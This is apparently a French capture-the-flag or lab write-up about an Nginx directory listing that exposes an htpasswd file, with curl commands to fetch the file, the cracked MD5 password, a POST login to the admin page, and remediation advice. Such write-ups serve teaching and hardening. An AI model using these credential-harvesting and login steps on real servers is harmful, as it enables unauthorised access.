# Directory Listing and Weak Credentials on Sensitive Resources

## Description de la vulnérabilité

L'activation du *Directory Listing* sur `/whatever/` permet d'accéder publiquement au fichier `htpasswd`. Ce dernier expose un hash MD5 non salé et vulnérable aux attaques par dictionnaire, permettant la compromission des identifiants administratifs.

## Méthode d'exploitation

L'exploitation extrait le hash via l'index du répertoire, l'inverse, et soumet les identifiants en POST.

1. **Exfiltration :** Téléchargement du fichier contenant les identifiants :

```bash
curl -s "http://192.168.159.133/whatever/htpasswd"

```

*Sortie :* `root:437394baff5aa33daa618be47b75cb49`
2. **Inversion :** Déchiffrement du hash MD5 via CrackStation : `437394baff5aa33daa618be47b75cb49` $\rightarrow$ `qwerty123@`.
3. **Authentification :** Soumission du formulaire pour obtenir le flag :

```bash
curl -s -X POST -d "username=root&password=qwerty123@&Login=Login" "http://192.168.159.133/admin/"

```

## Remédiation

La sécurisation nécessite la désactivation de l'indexation et le durcissement du stockage des secrets.

1. **Désactivation de l'indexation :** Configuration de la directive `autoindex` à `off` dans le bloc serveur ou localisation de Nginx.
2. **Isolation des secrets :** Stockage du fichier `htpasswd` en dehors de la racine publique du serveur.
3. **Durcissement cryptographique :** Remplacement de MD5 par un algorithme de hachage robuste et nativement salé (`bcrypt`).
